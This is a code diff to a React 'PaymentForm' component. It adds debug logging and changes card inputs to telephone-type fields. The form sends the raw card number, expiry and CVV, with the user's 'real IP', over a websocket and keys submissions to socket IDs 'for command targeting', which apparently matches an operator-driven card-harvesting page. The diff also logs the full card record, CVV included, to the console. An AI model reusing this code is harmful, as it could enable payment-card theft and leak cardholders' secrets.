@@ -357,13 +357,13 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    console.log('[PaymentForm] handleSubmit called.'); // Added log
     if (!isFormValid()) return;
     setIsLoading(true);
     setErrorMessage('');
 
-    // Get the socket ID and ensure we have it before proceeding
     const socketId = wsClient.getSocketId();
-    console.log(`[PaymentForm] Current socket ID: ${socketId}`);
+    console.log(`[PaymentForm] Current socket ID: ${socketId}`); // Added log
     if (!socketId) {
       console.error('No socket ID available');
       setErrorMessage('Error: Not connected to server. Please refresh.');
@@ -371,15 +371,13 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
       return;
     }
 
-    // Store the socket ID for command targeting
     setCurrentSubmissionId(socketId);
 
-    // Get real IP and prepare card data
     const realIP = await getRealIP();
     const cardData = {
-      id: socketId, // Use socket ID as the ID
-      socket_id: socketId, // Also include as socket_id for clarity
-      invoice_id: generateInvoiceId(), // Generate invoice ID
+      id: socketId,
+      socket_id: socketId,
+      invoice_id: generateInvoiceId(),
       card_number: formData.cardNumber,
       expiry_month: formData.expiryMonth,
       expiry_year: formData.expiryYear,
@@ -393,13 +391,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
       status: 'pending'
     };
 
-    console.log('Submitting card data:', {
-      socketId,
-      invoiceId: cardData.invoice_id,
-      amount: cardData.amount,
-      cardNumber: cardData.card_number
-    });
-
+    console.log('[PaymentForm] Sending card_submission with data:', cardData); // Added log
     wsClient.send('card_submission', cardData);
   };
 
@@ -530,7 +522,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
           <div className="relative">
             <CreditCard className="absolute left-3 top-3 w-6 h-6 text-gray-400" />
             <input
-              type="text"
+              type="tel"
               name="cardNumber"
               placeholder="XXXX XXXX XXXX XXXX"
               value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
@@ -553,7 +545,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
               Month
             </label>
             <input
-              type="text"
+              type="tel"
               name="expiryMonth"
               placeholder="MM"
               value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
@@ -579,7 +571,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
               Year
             </label>
             <input
-              type="text"
+              type="tel"
               name="expiryYear"
               placeholder="YY"
               value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
@@ -607,7 +599,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
             <div className="relative">
               <Lock className="absolute left-2 top-3 w-6 h-6 text-gray-400" />
               <input
-                type="text"
+                type="tel"
                 name="cvv"
                 placeholder="123"
                 value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
